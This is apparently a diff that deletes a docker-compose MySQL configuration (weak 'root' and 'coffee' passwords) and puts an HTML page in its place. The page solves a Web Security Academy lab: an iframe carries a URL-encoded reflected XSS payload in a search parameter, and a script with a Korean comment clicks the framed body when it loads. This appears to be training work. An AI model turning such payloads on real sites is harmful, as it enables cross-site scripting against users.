@@ -1,23 +1,8 @@
-services:
-  mysql:
-    image: mysql:8.4
-    container_name: coffee-mysql
+<iframe src="https://[너의-랩-고유-ID].web-security-academy.net/?search=%3Cbody+onclick%3Dprint%28%29+style%3D%22width%3A100vw%3Bheight%3A100vh%3Bposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3B%22%3E" id="hack"></iframe>
 
-    environment:
-      MYSQL_ROOT_PASSWORD: root
-      MYSQL_DATABASE: coffee_writer
-      MYSQL_USER: coffee
-      MYSQL_PASSWORD: coffee
-
-    ports:
-      - "3306:3306"
-
-    volumes:
-      - mysql_data:/var/lib/mysql
-
-    command:
-      - --character-set-server=utf8mb4
-      - --collation-server=utf8mb4_unicode_ci
-
-volumes:
-  mysql_data:
+<script>
+    // iframe(액자)이 로드 완료되면 내부의 body를 강제로 클릭!
+    document.getElementById('hack').addEventListener('load', function() {
+        this.contentWindow.document.body.click();
+    });
+</script>
